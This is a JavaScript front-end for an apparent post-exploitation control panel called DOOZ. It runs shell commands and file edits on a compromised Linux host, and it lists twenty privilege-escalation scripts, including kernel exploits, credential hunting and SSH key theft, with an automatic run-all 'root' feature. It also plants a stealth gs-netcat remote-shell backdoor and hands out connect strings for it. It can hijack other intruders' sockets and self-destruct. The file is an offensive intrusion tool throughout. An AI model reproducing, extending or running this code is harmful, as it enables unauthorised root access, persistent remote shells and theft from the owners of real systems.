// DOOZ v12.3 - Fixed
const $=id=>document.getElementById(id);
const api=async(e,d)=>{
    try{
        const r=await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})});
        return r.json();
    }catch(x){
        console.error('API error:',e,x);
        return{error:x.message,output:''};
    }
};

document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));

let cwd='/',currentFile='',sysData={},sessionRemaining=7200;

function nav(p){
    document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));
    document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));
    $('p-'+p)?.classList.add('on');
    document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');
    if(p==='root')initMethodCards();
    if(p==='proc')loadProc();
    if(p==='gs')gsScan();
    if(p==='files')fmLoad(cwd);
}

function openModal(id){$(id)?.classList.add('on');}
function closeModal(id){$(id)?.classList.remove('on');}

// Timer
async function updateSessionTimer(){
    try{
        const r=await api('timer');
        if(r.remaining!==undefined)sessionRemaining=r.remaining;
    }catch(e){console.error('Timer error:',e);}
}

function renderTimer(){
    const mins=Math.floor(sessionRemaining/60),secs=sessionRemaining%60;
    const el=$('session-timer');
    if(el){
        el.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
        el.className='session-timer'+(sessionRemaining<300?' danger':sessionRemaining<900?' warning':'');
    }
    if(sessionRemaining>0)sessionRemaining--;
    if(sessionRemaining<=0){
        document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:#ef4444;font-size:20px">SESSION EXPIRED</div>';
    }
}

// Init
async function init(){
    console.log('DOOZ init starting...');
    
    // Timer
    await updateSessionTimer();
    setInterval(renderTimer,1000);
    setInterval(updateSessionTimer,60000);
    
    // Load sysinfo
    console.log('Loading sysinfo...');
    const r=await api('run',{path:'scripts/sysinfo.sh'});
    console.log('Sysinfo response:',r);
    
    if(r.output){
        try{
            const d=JSON.parse(r.output);
            sysData=d;
            if($('s_user'))$('s_user').textContent=d.user||'-';
            if($('s_uid'))$('s_uid').textContent='uid:'+(d.uid||'?');
            if($('s_kernel'))$('s_kernel').textContent=(d.kernel||'-').split('-')[0];
            if($('s_up'))$('s_up').textContent=d.uptime||'-';
            if($('s_mem'))$('s_mem').textContent=d.mem||'-';
            if($('th'))$('th').textContent=d.hostname||'target';
            document.title='DZ • '+(d.hostname||'target');
            if($('cfg-info'))$('cfg-info').textContent=JSON.stringify(d,null,2);
            console.log('Sysinfo loaded OK');
        }catch(e){
            console.error('Sysinfo parse error:',e,'Raw:',r.output);
        }
    }else{
        console.error('No sysinfo output. Response:',r);
    }
    
    fmLoad('/');
    startLive();
    checkGsAlert();
    initMethodCards();
}

function startLive(){
    async function u(){
        const r=await api('exec',{cmd:"cat /proc/loadavg 2>/dev/null|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}';df / 2>/dev/null|tail -1|awk '{gsub(/%/,\"\");print $5}'"});
        const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');
        if($('live-stats')){
            $('live-stats').innerHTML=`
                <div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>CPU</span><span>${load||'0'}</span></div></div>
                <div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>MEM</span><span>${mem||'0'}%</span></div><div class="stat-bar"><i style="width:${mem||0}%;background:${(parseInt(mem)||0)>80?'var(--red)':'var(--green)'}"></i></div></div>
                <div><div style="display:flex;justify-content:space-between;font-size:10px"><span>DISK</span><span>${disk||'0'}%</span></div><div class="stat-bar"><i style="width:${disk||0}%;background:${(parseInt(disk)||0)>80?'var(--red)':'var(--green)'}"></i></div></div>`;
        }
    }
    u();setInterval(u,5000);
}

async function checkGsAlert(){
    const r=await api('run',{path:'scripts/gscan.sh'});
    try{
        const d=JSON.parse(r.output||'{}');
        const gs=(d.gsockets||[]).filter(g=>g.type==='process');
        if(gs.length&&$('dash-alert')){
            $('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${gs.length} GSockets!</strong><a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View</a></div></div>`;
        }
    }catch(e){}
}

// LPE Methods
const LPE_METHODS=[
    {id:'01_sudo',name:'Sudo NOPASSWD',desc:'Check sudo misconfigurations'},
    {id:'02_suid',name:'SUID Binaries',desc:'Find exploitable SUID files'},
    {id:'03_passwd',name:'Writable /etc/passwd',desc:'Direct user injection'},
    {id:'04_docker',name:'Docker Socket',desc:'Container escape'},
    {id:'05_capabilities',name:'Capabilities',desc:'Linux capabilities abuse'},
    {id:'06_kernel',name:'Kernel Exploit',desc:'DirtyPipe, DirtyCOW, PwnKit'},
    {id:'07_cron',name:'Cron Jobs',desc:'Writable cron entries'},
    {id:'08_ldpreload',name:'LD_PRELOAD',desc:'Sudo env_keep'},
    {id:'09_redis',name:'Redis',desc:'Redis misconfig RCE'},
    {id:'10_passwords',name:'Password Hunt',desc:'Hunt credentials'},
    {id:'11_nfs',name:'NFS no_root_squash',desc:'NFS root escalation'},
    {id:'12_path',name:'Writable PATH',desc:'PATH hijacking'},
    {id:'13_dbus',name:'D-Bus',desc:'D-Bus policy exploitation'},
    {id:'14_lxd',name:'LXD/LXC',desc:'Container privilege escape'},
    {id:'15_systemd',name:'Systemd',desc:'Service manipulation'},
    {id:'16_sshkeys',name:'SSH Keys',desc:'Key theft and injection'},
    {id:'17_mysql',name:'MySQL UDF',desc:'User-defined function RCE'},
    {id:'18_tmux',name:'Tmux/Screen',desc:'Session hijacking'},
    {id:'19_pspy',name:'Process Monitor',desc:'Background process discovery'},
    {id:'20_final',name:'Final Checks',desc:'World-writable, SGID, misc'}
];

function initMethodCards(){
    const el=$('method-list');
    if(!el)return;
    let h='';
    LPE_METHODS.forEach((m,i)=>{
        h+=`<div class="method-card" id="mc-${i}"><div class="method-header" onclick="toggleMethod(${i})"><span class="method-num">${String(i+1).padStart(2,'0')}</span><span class="method-name">${m.name}<br><small style="color:var(--dim);font-size:10px">${m.desc}</small></span><span class="method-status pending" id="mstat-${i}">pending</span><span class="method-toggle">▼</span></div><div class="method-body"><div class="method-output" id="mout-${i}">Click "Run" to execute</div><div class="method-actions"><button class="btn btn-sm" onclick="runSingleMethod(${i})">▶ Run</button></div></div></div>`;
    });
    el.innerHTML=h;
}

function toggleMethod(idx){$('mc-'+idx)?.classList.toggle('expanded');}

async function runSingleMethod(idx){
    const m=LPE_METHODS[idx];
    const card=$('mc-'+idx),stat=$('mstat-'+idx),out=$('mout-'+idx);
    card?.classList.add('expanded');
    if(stat){stat.textContent='checking';stat.className='method-status checking';}
    if(out)out.innerHTML='<span style="color:var(--gold)">Running...</span>';
    
    const r=await api('run',{path:'lpe_methods/'+m.id+'.sh'});
    const output=r.output||'No output';
    
    let fmt=output.split('\n').map(l=>{
        if(l.includes('[+]'))return`<span style="color:var(--green)">${l}</span>`;
        if(l.includes('[-]'))return`<span style="color:var(--red)">${l}</span>`;
        if(l.includes('[!]'))return`<span style="color:#f59e0b">${l}</span>`;
        if(l.includes('[*]'))return`<span style="color:var(--gold)">${l}</span>`;
        return l;
    }).join('\n');
    
    if(out)out.innerHTML=`<pre style="margin:0;white-space:pre-wrap">${fmt}</pre>`;
    if(stat){
        if(output.includes('[+]')||output.includes('VULNERABLE')){stat.textContent='success';stat.className='method-status success';}
        else if(output.includes('[!]')){stat.textContent='partial';stat.className='method-status partial';}
        else{stat.textContent='clean';stat.className='method-status failed';}
    }
    if(output.includes('ROOT_SECRET:')&&$('root-result')){
        const match=output.match(/ROOT_SECRET:([^\s\n]+)/);
        if(match)$('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT!</h3><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${match[1]} -i</code></div>`;
    }
}

async function runAllMethods(){
    const btn=$('btn-autoroot');
    if(btn){btn.disabled=true;btn.textContent='Running...';}
    for(let i=0;i<LPE_METHODS.length;i++){await runSingleMethod(i);await new Promise(r=>setTimeout(r,300));}
    if(btn){btn.disabled=false;btn.textContent='🚀 Run All';}
}

// GSSocket
async function gsScan(){
    const list=$('gs-list'),alert=$('gs-alert');
    if(list)list.innerHTML='<div style="padding:20px;text-align:center;color:var(--dim)">Scanning...</div>';
    
    const r=await api('run',{path:'scripts/gscan.sh'});
    console.log('gscan result:',r);
    
    try{
        const d=JSON.parse(r.output||'{"gsockets":[]}');
        const items=d.gsockets||[];
        const procs=items.filter(g=>g.type==='process');
        const secrets=items.filter(g=>g.type==='secret_file');
        
        if(alert){
            if(procs.length)alert.innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${procs.length} Active GSockets!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`;
            else alert.innerHTML=`<div class="alert success"><span class="alert-icon">✓</span><div class="alert-text">Clean</div></div>`;
        }
        
        let h='';
        procs.forEach(g=>{h+=`<div class="gs-card hostile"><div class="gs-header"><span class="gs-badge hostile">PROCESS</span><span class="gs-pid">PID: ${g.pid}</span></div><div class="gs-body"><div class="gs-row"><span>User:</span><span>${g.user||'-'}</span></div><div class="gs-row"><span>Secret:</span><span class="gs-secret">${g.secret||'hidden'}</span></div>${g.secret?`<div class="gs-row"><span>Connect:</span><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${g.secret} -i</code></div>`:''}</div><div class="gs-actions"><button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button></div></div>`;});
        secrets.forEach(g=>{h+=`<div class="gs-card"><div class="gs-header"><span class="gs-badge">SECRET</span></div><div class="gs-body"><div class="gs-row"><span>Path:</span><span style="font-size:10px">${g.path}</span></div><div class="gs-row"><span>Secret:</span><span class="gs-secret">${g.secret||'-'}</span></div><div class="gs-row"><span>Owner:</span><span>${g.owner||'-'}</span></div>${g.secret?`<div class="gs-row"><span>Hijack:</span><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${g.secret} -i</code></div>`:''}</div></div>`;});
        
        if(list)list.innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No GSockets</div>';
    }catch(e){
        console.error('gscan parse error:',e);
        if(list)list.innerHTML=`<div style="padding:20px"><div style="color:var(--red)">Error: ${e.message}</div><pre style="background:#000;padding:10px;margin-top:8px;font-size:10px;max-height:200px;overflow:auto">${r.output||'No output'}</pre></div>`;
    }
}

async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});setTimeout(gsScan,500);}
async function gsKillAll(){if(!confirm('Kill ALL?'))return;await api('exec',{cmd:"pkill -9 -f 'gs-netcat|defunct'"});setTimeout(gsScan,500);}

async function gsPlant(){
    const secret=prompt('Secret (empty=random):');
    const result=$('gs-plant-result');
    if(result)result.innerHTML='<div style="text-align:center;padding:20px;color:var(--gold)">🔄 Planting...</div>';
    openModal('modal-gsplant');
    
    const r=await api('run',{path:'scripts/gs_implant.sh '+(secret||'')});
    console.log('gsplant result:',r);
    
    try{
        const lines=(r.output||'').trim().split('\n');
        const d=JSON.parse(lines[lines.length-1]);
        if(d.status==='success'&&result){
            result.innerHTML=`<div class="gs-success-box"><div style="font-size:24px;margin-bottom:10px">✅</div><h3 style="color:var(--green);margin-bottom:16px">Stealth Planted!</h3><div class="gs-info-grid"><div class="gs-info-row"><span>Secret:</span><span class="gs-secret-big">${d.secret}</span></div><div class="gs-info-row"><span>Binary:</span><span>${d.binary}</span></div><div class="gs-info-row"><span>Instances:</span><span>${d.instances}</span></div></div><div style="margin-top:16px;padding:12px;background:#000;border-radius:8px"><div style="color:var(--dim);font-size:10px;margin-bottom:4px">CONNECT (click to copy)</div><code onclick="navigator.clipboard.writeText(this.textContent)" style="cursor:pointer">${d.connect}</code></div><div style="margin-top:8px;font-size:10px;color:var(--dim)">Features: ${(d.features||[]).join(', ')}</div></div>`;
        }else throw new Error(d.message||'Unknown');
    }catch(e){
        console.error('gsplant parse error:',e);
        if(result)result.innerHTML=`<div style="text-align:center;padding:20px"><div style="font-size:24px;margin-bottom:10px">❌</div><div style="color:var(--red)">Failed: ${e.message}</div><pre style="background:#000;padding:10px;margin-top:12px;font-size:10px;text-align:left;max-height:150px;overflow:auto">${r.output||''}</pre></div>`;
    }
    setTimeout(gsScan,1000);
}

// Terminal
function addLine(el,t,c){const d=document.createElement('div');d.className='ln '+(c||'');d.textContent=t;$(el)?.appendChild(d);if($(el))$(el).scrollTop=1e9;}
async function rs(path){const el=$('term-out');if(el)el.innerHTML='';addLine('term-out','$ bash '+path,'cmd');const r=await api('run',{path});(r.output||'No output').split('\n').forEach(l=>addLine('term-out',l,'ok'));}
async function termExec(){const c=$('term-cmd')?.value?.trim();if(!c)return;if($('term-cmd'))$('term-cmd').value='';addLine('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>addLine('term-out',l,''));}
async function loadProc(){const el=$('proc-out');if(!el)return;el.innerHTML='';addLine('proc-out','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -40'});(r.output||'').split('\n').forEach(l=>addLine('proc-out',l,''));}

// Files
async function fmLoad(path){
    cwd=path;
    const parts=path.split('/').filter(Boolean);
    let bc='<a href="#" onclick="fmLoad(\'/\');return false">~</a>';
    parts.forEach((p,i)=>{const fp='/'+parts.slice(0,i+1).join('/');bc+=` / <a href="#" onclick="fmLoad('${fp}');return false">${p}</a>`;});
    if($('fm-path'))$('fm-path').innerHTML=bc;
    
    const r=await api('files',{path});
    let h='';
    if(path!=='/'){const pr=path.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" ondblclick="fmLoad('${pr}')"><div class="fm-icon dir">⬆</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}
    const files=(r.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
    const icons={sh:'⚡',py:'🐍',js:'📜',c:'©',txt:'📝',conf:'⚙',gz:'📦',tar:'📦',dat:'🔑'};
    files.forEach(f=>{const fp=path==='/'?'/'+f.name:path+'/'+f.name;const isDir=f.type==='dir';const ext=f.name.split('.').pop().toLowerCase();h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} • ${f.size||''}</div></div></div>`;});
    if($('fm-list'))$('fm-list').innerHTML=h||'Empty';
}
function fmUp(){fmLoad(cwd.split('/').slice(0,-1).join('/')||'/');}
function fmRefresh(){fmLoad(cwd);}
async function fmView(path){currentFile=path;if($('modal-view-title'))$('modal-view-title').textContent=path.split('/').pop();const r=await api('read',{path});if($('modal-view-content'))$('modal-view-content').textContent=r.content||'(empty/binary)';openModal('modal-view');}
async function fmEdit(path){currentFile=path||currentFile;if($('modal-edit-title'))$('modal-edit-title').textContent='Edit: '+currentFile.split('/').pop();const r=await api('read',{path:currentFile});if($('modal-edit-content'))$('modal-edit-content').value=r.content||'';closeModal('modal-view');openModal('modal-edit');}
async function fmSaveEdit(){await api('write',{path:currentFile,content:$('modal-edit-content')?.value||''});closeModal('modal-edit');fmRefresh();}
function fmNewFile(){if($('modal-new-name'))$('modal-new-name').value='';if($('modal-new-content'))$('modal-new-content').value='';openModal('modal-new');}
function fmNewDir(){const n=prompt('Folder name:');if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);}
async function fmSaveNew(){const n=$('modal-new-name')?.value?.trim();if(!n)return;await api('write',{path:cwd+'/'+n,content:$('modal-new-content')?.value||''});closeModal('modal-new');fmRefresh();}

async function pull(){await api('pull');location.reload();}
async function nuke(){if(!confirm('⚠️ DESTRUCT ALL?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}

// Start
init();
